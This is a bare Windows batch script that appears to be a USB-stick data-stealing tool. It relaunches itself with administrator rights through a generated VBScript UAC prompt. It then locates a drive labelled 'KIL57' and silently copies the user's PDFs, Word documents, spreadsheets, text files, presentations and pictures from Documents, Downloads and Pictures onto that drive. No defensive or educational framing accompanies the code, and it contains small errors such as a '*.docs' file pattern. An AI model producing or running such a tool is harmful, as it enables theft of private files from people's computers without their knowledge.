 @echo off

     call :isAdmin

     if %errorlevel% == 0 (
        goto :run
     ) else (
   
        goto :UACPrompt
     )

     exit /b

     :isAdmin
        fsutil dirty query %systemdrive% >nul
     exit /b

     :run
	@ECHO OFF
FOR %%a in ( d e f g h i j k l m n o p q r s t u v w x y z) do vol %%a: 2>nul |find "KIL57" >nul && set drv=%%a:
echo. %drv%
			color 0a
			title extracting documents form documents folder 
			xcopy /s "C:\Users\%USERNAME%\Documents\*.pdf" "%drv%\extractor\user_data\user\documents\docs_from_user"
			
			title extracting documents from downloads folder
			xcopy /s "C:\Users\%USERNAME%\Downloads\*.pdf" "%drv%\extractor\user_data\user\downloads\docs_inside_downloads_from_user"
			
			title extracting word documents from documents folder
			xcopy /s "C:\Users\%USERNAME%\Documents\*.docx" "%drv%\extractor\user_data\user\documents\word_docs_from_user"
			
			title extracting word documents from download folder 
			xcopy /s "C:\Users\%USERNAME%\Downloads\*.docs" "%drv%\extractor\user_data\user\downloads\word_docs_inside_downloads_from_user"
			
			title extracting spreadsheets from documents folder
			xcopy /s "C:\Users\%USERNAME%\Documents\*.xlsx" "%drv%\extractor\user_data\user\documents\spreadsheets_from_documents"
			
			title extracting spreadsheets from downloads folder
			xcopy /s "C:\Users\%USERNAME%\Downloads\*.xlsx" "%drv%\extractor\user_data\user\downloads\spreadsheets_from_downloads_folder"
			
			title extracting text files from documents folder
			xcopy /s "C:\Users\%USERNAME%\Documents\*.txt" "%drv%\extractor\user_data\user\documents\text_files_from_documents"
			
			title extracting presentations from documents folder
			xcopy /s "C:\Users\%USERNAME%\Documents\*.pptx" "%drv%\extractor\user_data\user\documents\presentations_from_documents"
			
			title extracting presentattions from downloads folder 
			xcopy /s "C:\Users\%USERNAME%\Downloads\*.pptx" "%drv%\extractor\user_data\user\downloads\presentation_from_downaloads_folder"
			
			title extracting pictures from picture folder
			xcopy /s "C:\Users\%USERNAME%\Pictures" "%drv%\extractor\user_data\user\documents\pics_from_user"
			
			title extracting pictures from download folder
			xcopy /s "C:\Users\%USERNAME%\Downloads\*.jpg" "%drv%\extractor\user_data\user\downloads\pics_inside_downloads_from_user"
			
			title extracting png files from download folder
			xcopy /s "C:\Users\%USERNAME%\Downloads\*.png" "%drv%\extractor\user_data\user\downloads\pics_inside_downloads_from_user"

     exit /b

     :UACPrompt
       echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
       echo UAC.ShellExecute "cmd.exe", "/c %~s0 %~1", "", "runas", 1 >> "%temp%\getadmin.vbs"

       "%temp%\getadmin.vbs"
       del "%temp%\getadmin.vbs"
	   
      exit /B`
	  